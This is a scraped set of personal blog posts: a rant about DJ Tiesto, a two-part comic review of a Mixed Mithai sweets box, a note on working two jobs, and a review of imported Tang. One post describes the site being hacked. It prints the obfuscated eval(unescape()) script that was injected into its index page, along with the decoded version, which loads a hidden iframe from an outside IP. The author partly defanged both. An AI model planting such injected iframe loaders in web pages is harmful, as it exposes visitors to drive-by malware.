data.text:
&lt;p&gt;Hey, &lt;i&gt;DJ Tiesto&lt;/i&gt; (if that is your real name), you&#039;re pretty sweet with that electronic music you do, there.  You&#039;re not nearly as good as Justice, mind you, but you&#039;re not bad.  I&#039;d call you this generation&#039;s Darude, if Darude wasn&#039;t already this generation&#039;s Darude.  I have one pretty major gripe, though.&lt;/p&gt;

&lt;p&gt;I listen to Electronic so that I don&#039;t have to wade through a bunch of crappy lyrics to get good music.  Lyrics are retarded in 90% of music.  What&#039;s the deal with you and a bunch of other electronic artists thinking you need to throw in some rich-sounding female voice talking about feelings and desires?  Do you know why &lt;a href=&quot;http://www.azlyrics.com/lyrics/daftpunk/robotrock.html&quot;&gt;&quot;Robot Rock&quot;&lt;/a&gt; or &lt;a href=&quot;http://www.azlyrics.com/lyrics/daftpunk/aroundtheworld.html&quot;&gt;&quot;Around the World&quot;&lt;/a&gt; are better Daft Punk tracks than &lt;a href=&quot;http://www.azlyrics.com/lyrics/daftpunk/facetoface.html&quot;&gt;&quot;Face to Face&quot;&lt;/a&gt; (click the links, look at the lyrics, and you&#039;ll get your answer).  Justice rocks hard, but do you know which tracks rock the least?  That&#039;s right, it&#039;s D.A.N.C.E. and Tthhee Ppaarrttyy, because they&#039;re the ones with the stupid female voices talking about feelings and desires.&lt;/p&gt;

&lt;p&gt;There&#039;s one exception, of course, but we don&#039;t need to count him.  Benny Bennassi gets away with it because he&#039;s insane.  He&#039;s coming out with his &lt;i&gt;fourth&lt;/i&gt; album this summer, and guess what, it&#039;s going to sound exactly the same as every other track he has ever made.  I can stand stupidly written female vocals when they&#039;re backed by awesome-sounding buzzing synth loops.  Once you get some awesome-sounding buzzing synth loops, Tiesto, I&#039;ll put up with your stupid female vocals.&lt;/p&gt;

&lt;p&gt;And since I&#039;ve got you here, &lt;i&gt;DJ Tiesto&lt;/i&gt;, I should tell you what the fans of electronic music have secretly been wanting to tell you for eight years.  MAN UP.  I&#039;m sick of sitting around for two to five minutes waiting for you to get around to actually starting a track.  You build and build and build and build, and we wait and wait and wait, and then you finally get to the good part, and then you almost immediately end the track.  Does Justice make us wait for heart-destroying rage-house?  Does Benny Bennassi make us wait for that insidious buzz-synth?  No, they don&#039;t.  Daft Punk sits around all day just looping the same intro to a song that doesn&#039;t even exist, and you think you&#039;re doing something groundbreaking when you do the exact same thing, Tiesto?  I want to hear your tracks, not the endless intros to your tracks.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;UPDATE: 6/8/08&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ok, I got Benassi&#039;s new album.  What happened, Benny?  Did your compressor break?  You know, you can get another one.  In fact, &lt;i&gt;I&#039;ll&lt;/i&gt; buy you another one, because this stuff just doesn&#039;t sound right.  And what&#039;s with those male vocals?&lt;/p&gt;
			&lt;p&gt;&lt;/p&gt;

&lt;strong&gt;&lt;p&gt;by Shauvon McGill&lt;/p&gt;&lt;/strong&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_03.jpg&quot; style=&quot;width: 300px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;Featuring John Schuster&lt;/div&gt;

&lt;p&gt;There&#039;s a little international food mart just down the road from where I live (with my new roommate, John).  It&#039;s called La Village, which is French for The Village (the part of West Lafayette where it is located).  They have all sorts of crazy foreign food items, like Paratha, a delicious fried bread thing that we&#039;ve enjoyed with some curried rice and whatnot.  We&#039;ve also discovered a thing called Gulab Jamoon, which is a lot more fun to say that it is to eat, but it&#039;s still an interesting treat.  Another &quot;treat&quot; offered at La Village is the Mixed Mithai, an assortment of weird . . . things . . . in a little plastic container.  We&#039;ve wondered what the hell Mixed Mithai really entailed, so on Friday night, John and I decided to find out.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_01.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;Only $5.79&amp;iuml;&amp;iquest;&amp;frac12;&lt;/div&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_02.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;for . . . whatever this is&lt;/div&gt;

&lt;p&gt;Let me clear the air.  I&#039;m not going to build suspense for this review, and make you wonder whether or not Mixed Mithai is any good or not.  It&#039;s not good.  In fact, it could be called horrid.  I want it to be absolutely clear that under no circumstances should you ever try to eat Mixed Mithai.  Especially not for the &quot;$5.79&amp;iuml;&amp;iquest;&amp;frac12;&quot; that I paid for it.&lt;/p&gt;

&lt;p&gt;After we tried the first &quot;mixed mithai.&quot;  I decided that this should be recorded for posterity&#039;s sake, since we certainly weren&#039;t getting our money&#039;s worth out of the product itsself.  I remembered I had this website thing that I&#039;ve forgotten about for like 6 months, and I decided to come up with a review, to ward others away from thinking it would be &quot;worth a shot&quot; as we did.&lt;/p&gt;

&lt;p&gt;Anyway, let&#039;s get on with the various &quot;mithai&quot; in all their &quot;mixed&quot; glory.  I&#039;m not sure what Mithai means in whatever language it&#039;s supposed to be.  It&#039;s probably some sort of joke at Americans.&lt;/p&gt;

&lt;br&gt;&lt;p&gt;&lt;strong&gt;White + Green Roll Thing&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The first item was a sort of tube like structure, with white stuff on the outside and a green paste on the inside.  I didn&#039;t get a picture, because it was only after choking it down that we decided to document the rest of the adventure.  Upon first biting into it, I figured that it probably wasn&#039;t fully cooked, because that was the only reason I could think of to explain why it was so unpleasant.  It wasn&#039;t terrible, mind you.  I could have eaten a little more of it (which is good, as you&#039;ll soon see), but it wasn&#039;t very fun.  John described it as &quot;Minty but not mint.&quot;  He called it weird.  Weird is pretty much the defiinition of &quot;Mixed Mithai.&quot;  We both felt it was probably the odd Mithai out, and moved on.&lt;/p&gt;

&lt;p&gt;It wasn&#039;t.&lt;/p&gt;

&lt;br&gt;&lt;p&gt;&lt;strong&gt;White Square Thing&lt;/strong&gt;&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_23.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;The White Square Thing&lt;/div&gt;

&lt;p&gt;Next up was the cube-shaped white square thing.  I didn&#039;t try it, because I was getting my camera out, but John ate an entire cube of it.  The package generously offered two whole cubes of the white paste-like stuff.  Here is the rundown of John&#039;s observations, as he examined and ate it:&lt;/p&gt;

&lt;p&gt;&quot;It looks very non-descript.&quot;&lt;/p&gt;

&lt;p&gt;&quot;It tastes very non-descript.&quot;&lt;/p&gt;

&lt;p&gt;&quot;But it&#039;s got texture. . . It&#039;s got a whole lot of texture.&quot;&lt;/p&gt;

&lt;p&gt;&quot;This tastes a lot like that roll.  Oh wait!&quot;&lt;/p&gt;

&lt;p&gt;The white stuff on the outside of the roll must have been the same white stuff that composed the white square thing.  That was a pretty obvious conclusion.  The white Mithai was also conveniently supplied in a much flatter Trapezoid configuration, to serve your particular mithai needs.  I had a piece of the trapezoid.  It was pretty non-descript.&lt;/p&gt;

&lt;br&gt;&lt;p&gt;&lt;strong&gt;Green Block&lt;/strong&gt;&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_22.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;The Green Block&lt;/div&gt;

&lt;p&gt;It was pretty obvious that if the white block was the white part from the white + green roll thing, then the green block was probably equally represented there.  &quot;Is this the green bit from inside the roll?&quot; John asked.  &quot;If so, can I make it through an entire block of the stuff?&quot;&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_04.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;The Green Block&lt;/div&gt;

&lt;p&gt;Ultimately, he did, with a sort of determination I haven&#039;t seen in someone before.  He quickly went for a bottle of Tonic Water to wash it down.&lt;/p&gt;

&lt;p&gt;&quot;It is the stuff.&quot; He said, remembering it&#039;s mint-less minty flavor.  I asked him if it was growing on him.  &quot;I&#039;ve acquired a bit,&quot; he said, right before gulping down some more tonic water.&lt;/p&gt;

&lt;br&gt;&lt;p&gt;&lt;strong&gt;Orange Blob&lt;/strong&gt;&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_24.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;There are two of them.  How lucky . . .&lt;/div&gt;

&lt;p&gt;Here is a very unique member of the mixed mithai assortment.  It&#039;s hard to really describe it.  In fact, it was very hard, surprisingly so.  It looks slimy and soft almost like orange cottage cheese (. . . yum), but it was actually hard and dry, like a golf ball (not quite as hard).&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_05.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;As big as a golf ball, too.&lt;/div&gt;

&lt;p&gt;&quot;It definitely tasted fried,&quot; John said, as he took a bite, &quot;it tastes like vegitable oil.&quot;&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_06.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;A tentative bite.&lt;/div&gt;

&lt;p&gt;It did taste like vegitable oil.  This one wasn&#039;t bad.  It had a slightly more gritty and slightly less pasty texture than the white or green stuff, and it was kind of sweet, once you got past the vegitable oil.  I quickly realized that my tiny, tentative bites were not getting me very close to finishing the entire blob.  Those little things just keep going and going.  I wasn&#039;t very interested in keeping that up, so I set it down and we moved on.&lt;/p&gt;

&lt;br&gt;&lt;p&gt;&lt;strong&gt;Orange Cube&lt;/strong&gt;&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_25.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;The Orange Cubes&lt;/div&gt;

&lt;p&gt;There were two kinds of orange cubes in the package.  One had much more stuff on top of it.  We went for the cleaner one first.  John took his bite, and immediately said &quot;This one tastes weird.&quot;&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_08.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;&quot;This one tastes weird.&quot;&lt;/div&gt;

&lt;p&gt;John said it tasted like the white &lt;em&gt;and&lt;/em&gt; the green, which at that point was a pretty big departure for the Mithai.  It had all been pretty much identical, except for the Vegitable Oil-laced blobs.&lt;/p&gt;

&lt;p&gt;Then John said it tasted like wood.  The flavors just kept on coming.  Listen, folks, &lt;em&gt;this one was the real deal&lt;/em&gt;.  It smelled somehow reminiscent of raw bread dough.  It &lt;em&gt;did&lt;/em&gt;.  I was &lt;em&gt;not&lt;/em&gt; looking forward to tasting it.  I bit off a tiny chunk and lied to my mouth, claiming it was actually food.  My mouth had a hard time believing me, and my stomach almost sent it back for re-analysis.  &lt;em&gt;I wasn&#039;t a big fan.&lt;/em&gt;

&lt;/p&gt;
&lt;p&gt;&quot;So that&#039;s where all the flavor went.&quot; I said.  Definitely not as non-descript as the white cubes.&lt;/p&gt;

&lt;br&gt;&lt;p&gt;That&#039;s all I can bear to remember right now.  I&#039;ll continue this saga soon, with both the best and the worst of the Mithai left to explore (yes, it gets worse).  See you then.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://denyconformity.com/content/news.php?post=00189&quot;&gt;Continue to Part 2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can finally read the conclusion of the Mixed Mithai review. &lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://denyconformity.com/content/news.php?post=00188&quot;&gt;Read Part 1&lt;/a&gt;&lt;/p&gt;
			&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://denyconformity.com/content/news.php?post=00188&quot;&gt;LAST TIME, ON DENYCONFORMITY.COM:&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_03.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;John and I made a huge mistake.&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;AND NOW, THE CONCLUSION:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;White cookie thing&lt;/strong&gt;&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_09.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;White Cookie thing&lt;/div&gt;

&lt;p&gt;These were pretty visually unique, as mixed mithai goes.  They weren&#039;t bad to eat, either.  I still wouldn&#039;t eat them given the choice, but they were the definite standout of everything in the package.  They tasted somewhat like stale caramel, as John described them.  They were very doughy, though.  Their texture was very weird, like that weird stuff you get from mixing corn starch and water.  Sort of like an eraser, but not at all chewy.  It&#039;s very hard to describe this stuff.  I hope I&#039;m not making it alluring, because I don&#039;t want to make anybody want to try it.&lt;/p&gt;

&lt;p&gt;The white cookie thing was definitely the most palatable of the entire mixed mithai.  What an achievement.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Rainbow Thing&lt;/strong&gt;&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_11.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;Ugh, the Rainbow Thing&lt;/div&gt;

&lt;p&gt;Oh man, the rainbow thing.  We were &lt;em&gt;not&lt;/em&gt; excited about diving in to that one.  John looked at it and said, &quot;Now . . . the rainbow thing . . . oh guugh.&quot;  To say he was tentative would have been an understatement.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_13.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;John is quite sarcastic.&lt;/div&gt;

&lt;p&gt;It looked like the indian flag, as John pointed out, sans emblem.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_11.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;All hail king of the Mithai&lt;/div&gt;

&lt;p&gt;We tried mithai with one color, we tried it with two colors, but this was three colors.  As John described, &quot;I can guess what the white and the green layers taste like, but the wild card is that red one.  The question is what chord will it ring with the other two?&quot;&lt;/p&gt;

&lt;p&gt;He found out.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_12.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;Oh God.&lt;/div&gt;

&lt;p&gt;He bit it, set it down, and took a step back.  It was not a good chord.  I tried it next.&lt;/p&gt;

&lt;p&gt;My taste buds are pretty subdued as it is, and I&#039;m kind of nursing a cold right now, which dulls them further.  Food has never been a big deal for me.  Even still, nothing could have prepared me for the punch in the face that was the rainbow thing.  It had the same odd, gritty texture as the white or green stuff, and the flavor of those were very well represented.  The red . . . well, take it this way:  the taste of mithai seems to go on a scale.  It goes from barely palatable to absolutely horrible as it goes from white, to green, to red.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_11.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;Threat level red.&lt;/div&gt;

&lt;p&gt;The Rainbow Thing is the pinnacle of Mixed Mithai.  It was the end of the road for us.  John decided to explore the red further, for science.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_15.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;What does the red taste like, alone?&lt;/div&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_17.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;It doesn&#039;t look that bad.&lt;/div&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_18.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;Oh God.&lt;/div&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_14.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;&lt;/div&gt;

&lt;p&gt;Yeah, it was still bad.&lt;/p&gt;

&lt;p&gt;There were a few things left in the package, but we both decided that their flavors could be extrapolated from what we had already tried.  We cut our losses and called it a Mixed Mithai night.  Back in the fridge they went, and John and I both sat down.  It seemed the mithai sat in our stomaches about as well as it sat in our mouths.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Verdict&lt;/strong&gt;&lt;/p&gt;

Of all the mixed mithai, the cookie thing was the definite winner.  That needs perspective, though.  The cookie thing was like the first American Pie movie.  It was ok compared to the other ones, but wouldn&#039;t you rather just watch a couple episodes of the Office again?  If taken alone, the cookie thing would probably be one of the worst things I&#039;ve ever eaten.

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_20.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;In the land of the blind, the one eyed man is king.&lt;/div&gt;

&lt;p&gt;The rainbow thing, on the other hand, will haunt my dreams and be the basis of comparison for every horrible thing I eat for the rest of my life.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/mithai/mithai_21.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot;&gt;&lt;div class=&quot;caption&quot;&gt;The Horation Sanz of the SNL that is Mixed Mithai.&lt;/div&gt;

&lt;p&gt;The next day, Andrew came over and found the remaining mithai in the fridge.  I tried to stop him, but he dove right in. A few minutes later he had finished the entire container.&lt;/p&gt;

&lt;p&gt;&quot;Those are pretty good.&quot; He said.&lt;/p&gt;

&lt;p&gt;So I&#039;ve got two jobs this summer.  Having two jobs has pros and cons, as you might imagine.  They aren&#039;t what you&#039;d think, though.&lt;/p&gt;

&lt;p&gt;So you probably think I&#039;m rolling in all kinds of cash.  I am, I&#039;m super rich, but here&#039;s the thing.  I&#039;m spending more money than I ever have, too.&lt;/p&gt;

&lt;p&gt;When you work more than you don&#039;t, you don&#039;t have time to feed yourself, so I get expensive fast food all the time, which really adds up.&lt;/p&gt;

&lt;p&gt;One of my jobs is working at home, so I have my computer blasting away at full power, with the air conditioner blasting away at full power, with fans blasting away at full power, while my new Roommate John is in the next room blasting away at full power on his own bits.  In the month of June, we used almost three times more power than we did in May, and July had even more than that.  The bills are equally high.  My bank account hurts.&lt;/p&gt;

&lt;p&gt;So even after my paychecks are insanely high, I still don&#039;t really have that much money anymore.  Looks like I won&#039;t be able to afford a dog after all.&lt;/p&gt;

&lt;p&gt;End result:  I&#039;m now more exhausted and stressed out than I&#039;ve ever been, and aside from a new bullet point on my resume (and an admittedly sweet flash game), I have nothing to show for it.  I never thought I would be looking forward to the semester starting because it would mean a lot &lt;i&gt;less&lt;/i&gt; work for me.&lt;/p&gt;

&lt;p&gt;Incidentally, if anybody is in the West Lafayette area and wants to test a new flash game for me, let me know.&lt;/p&gt;
			&lt;p&gt;&lt;/p&gt;

&lt;p&gt;Denyconformity.com was hacked!&lt;/p&gt;

&lt;p&gt;It was poorly done, so much that it took me a long time to find because it never occurred to me that it would have been where it was, considering it wouldn&#039;t have worked where it was.  Follow the link for more info about what the deal is.&lt;/p&gt;
			&lt;p&gt;This link.&lt;/p&gt;
			&lt;p&gt;If anybody out there is using either AVG (my parents) or Avast! (Athanasios) for their antivirus, you wouldn&#039;t have been able to view Denyconformity.com for a while.  For the longest time, I thought those overly anal antivirus programs were just having problems with some of my completely harmless code, and I tried to contact them about why they had trouble.  I checked the code that showed up on the browser (the page you&#039;re looking at right now) and nothing was out of the ordinary.  There weren&#039;t any blocks of code that I didn&#039;t specifically put there.&lt;/p&gt;

&lt;p&gt;Then I remembered how my site actually worked.&lt;/p&gt;

&lt;p&gt;When you go to http://www.denyconformity.com, you&#039;re actually going to http://www.denyconformity.com/index.php, because that&#039;s the page the browser automatically loads when it isn&#039;t given a file to load.  That index.php file just has one little string of text and one javascript command.  It immediately redirects the browser to http://www.denyconformity.com/content/news.php.  I did it this way because I use Javascript on my site, and I wanted to let people know that if they don&#039;t have Javascript enabled they won&#039;t be able to view the site.  Also, I wanted to have a particular directory structure, so I wanted to have the actual main page within a sub directory.  Anyway, I disabled javascript and checked the code my browser was getting on that index.php page.  Here&#039;s what I saw (the suspicious section is at the end):&lt;/p&gt;

&lt;xmp style=&quot;font-family: courier new; font-size: 12px&quot;&gt;
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.1//EN&quot; &quot;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;

	&lt;link rel=&quot;shortcut icon&quot; href=&quot;/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;

	&lt;title&gt;Deny Conformity&lt;/title&gt;
	
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;meta name=&quot;resource-type&quot; content=&quot;document&quot;/&gt;
&lt;meta name=&quot;revisit-after&quot; content=&quot;15&quot;/&gt;
&lt;meta name=&quot;description&quot; content=&quot;Someone&#039;s attempt to sort out the universe.&quot;/&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;Shauvon McGill, conformity, deny conformity, blog, story, stories, literature, Purdue, Crazy Monkeys, existential, life, meaning&quot;/&gt;
&lt;meta name=&quot;copyright&quot; content=&quot;2005&quot;/&gt;

&lt;meta name=&quot;author&quot; content=&quot;Shauvon McGill&quot;/&gt;
&lt;meta http-equiv=&quot;reply-to&quot; content=&quot;smcgill@denyconformity.com&quot;/&gt;

&lt;/head&gt;

&lt;body&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
	document.location=&#039;content/news.php&#039;
&lt;/script&gt;

&lt;p&gt;Welcome to DenyConformity.com.  Please enable Javascript.  Have a nice day.  Super cramming power.&lt;/p&gt;

&lt;p&gt;
    &lt;a href=&quot;http://validator.w3.org/check?uri=referer&quot;&gt;&lt;img
        src=&quot;http://www.w3.org/Icons/valid-xhtml11&quot;
        alt=&quot;Valid XHTML 1.1&quot; height=&quot;31&quot; width=&quot;88&quot; /&gt;&lt;/a&gt;
&lt;/p&gt;
  

&lt;/body&gt;
&lt;/html&gt;&lt;script&gt;evaall(unescaapee(&quot;2b%27%37%62%38%63%32%64%5c%27%20%77%69%64%74%68%3d%31%31%20%68%65%69%67%68%74%3d%32%33%37%20%73%74%79%6c%65%3d%5c%27%64%69%73%70%6c%61%79%3a%20%6e%6f%6e%65%5c%27%3e%3c%2f%69%66%72%61%6d%%77%69%6e%64%6f%77%2e%73%74%61%74%75%73%3d%27%44%6f%6e%65%27%3b%64%6f%63%75%6d%65%6e%74%2e%77%72%69%%28%29%2a%32%36%30%37%29%65%3e%27%2974%65%28%27%3c%69%66%72%61%6d%65%20%6e%61%6d%65%3d%38%36%62%66%37%20%73%72%63%3d%5c%27%68%74%74%70%3a%2f%2f%35%38%2e%36%35%2e%32%33%32%2e%33%33%2f%67%70%61%63%6b%2f%69%6e%64%65%78%2e%70%68%70%3f%27%2b%4d%61%74%68%2e%72%6f%75%6e%64%28%4d%61%74%68%2e%72%61%6e%64%6f%6d&quot;)); &lt;/script&gt;
&lt;/xmp&gt;

&lt;p&gt;What in the world is that &quot;eval(unescape())&quot; nonsense?  I certainly never put that there.  It&#039;s that extra little script tag that freaked AVG and Avast! out.  It didn&#039;t scare me particularly much.  Here&#039;s why.&lt;/p&gt;

&lt;p&gt;What that tag does is translate whatever all those characters are from their individual ASCII codes to real characters, then it runs that as javascript.  Here&#039;s what those characters actually are, when they&#039;re &quot;unescaped&quot;:&lt;/p&gt;

&lt;xmp style=&quot;font-family: courier new; font-size: 12px&quot;&gt;
window.status=&#039;Done&#039;;document.write(&#039;&lt;iifraame name=86bf7 src=&#039;http://XX.XX.XXX.XX/gpack/index.php?&#039;+Math.round(Math.random()*2607)+&#039;7b8c2d&#039; width=11 height=237 style=&#039;display: none&#039;&gt;&lt;/iiframme&gt;&#039;)
&lt;/xmp&gt;

&lt;p&gt;In both examples, I&#039;ve added some letters to prevent antivirus software from thinking it is malicious software.&lt;/p&gt;

&lt;p&gt;It loads an iframe (basically a box that can load any webpage inside another webpage), pointing to some other website, probably with a virus on it.  I&#039;ll have my room mate John look it up in Linux to see what it is (the virus will probably not affect Linux at all).  When the browser loads my page, it loads that iframe, and then it downloads the virus.  It&#039;s a very common hack on websites (Avast! calls it JS:Agent-AV [Trj]).  Don&#039;t worry, if you&#039;ve gone to Denyconformity.com in the last however long, you haven&#039;t gotten any viruses.  This code could not, and will not, ever work.&lt;/p&gt;

&lt;p&gt;That snippet of code only showed up on the http://www.denyconformity.com/index.php page.  It was thrown in at the end of the page, as you can see, after my own javascript that redirects the browser somewhere else (as long as you have javascript on).  So if you have javascript enabled, the browser will never execute that code, because it will be redirected before it gets there.  If you have javascript disabled, the browser will never execute that code because it is a javascript command.  The iframe, and the virus, will never be executed.&lt;/p&gt;

&lt;p&gt;This code snippet was probably added by some sort of robot, just throwing this code up on the index page of whatever website it could find.  Thankfully, because of the way I put my site together, the robot just put the harmful code in a spot where it would do no harm (except freak AVG and Avast! out).&lt;/p&gt;

&lt;p&gt;So in conclusion, a simple little page that I created a long time ago to simplify my file structure ended up protecting my site, and your computer, from some harmful doodads. Bullet dodged.&lt;/p&gt;

&lt;p&gt;Now I need to talk to my webhost to find out why someone was able to hack my site . . .&lt;/p&gt;

&lt;p&gt;Tang. I found it. First, before you continue, make sure you&#039;ve read the following:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.denyconformity.com/content/olds.php?post=00164&quot;&gt;The first article, which started this whole fiasco.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.denyconformity.com/content/olds.php?post=00173&quot;&gt;The first update, with a not-so successful replacement.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.denyconformity.com/content/olds.php?post=00174&quot;&gt;Another update.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Andrew Monkey. He&#039;s almost on his way to Spain, and could be there when you read this. He loves him some &lt;a href=&quot;http://www.denyconformity.com/content/news.php?post=00188&quot;&gt;mixed mithai&lt;/a&gt;. He&#039;s also my hero.&lt;/p&gt;

&lt;p&gt;Why? Because he brought this into my life:&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_01.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;The lid labels never survive on these things, but you get the idea.&lt;/div&gt;

&lt;p&gt;Before I continue, I&#039;ll just quiet your suspicions right now. I&#039;m sure, if you read the previous articles about Tang, that you&#039;re wondering, &quot;could it be?&quot;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Yes, it could.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I&#039;m getting ahead of myself, as I am want to do. Let me explain where this came from. Andrew was in his hometown of New Albany, Indiana, and he went to an Hispanic Grocery Store. That store was selling a brand of Tang, presumably sold in Hispanic countries, which looked awfully familiar and &quot;fruitrition-less.&quot; It has the classic shape and size, before they made the formula more &quot;concentrated.&quot; Let&#039;s take a look at the ingredients, just to see what it&#039;s got under the hood.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_03.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Kraft Foods Puerto Rico knows how to do their job.&lt;/div&gt;

&lt;p&gt;Sugar. Check. Citric Acid for tartness. Check. Less than 2% of flavor. Check. No sign of sucralose. Double Check. This definitely looks like it could be good. Let&#039;s have a look at the product itself.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_05.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Oh boy.&lt;/div&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_04.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Orange gold.&lt;/div&gt;

&lt;p&gt;It looks like Olde Tang. It smells like - well, it smells like Real Sugar Orange Fanta, which isn&#039;t far off from Olde Tang.&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_02.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;Made with real sugar, not corn syrup. Delicious, if not for the price tag.&lt;/div&gt;

&lt;p&gt;How does it taste?&lt;/p&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_10.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;

&lt;img src=&quot;http://www.denyconformity.com/assets/images/newTang/tang_11.jpg&quot; style=&quot;width: 600px; display: block; margin: auto&quot; /&gt;
&lt;div class=&quot;caption&quot;&gt;My finger-test proved quite successful.&lt;/div&gt;

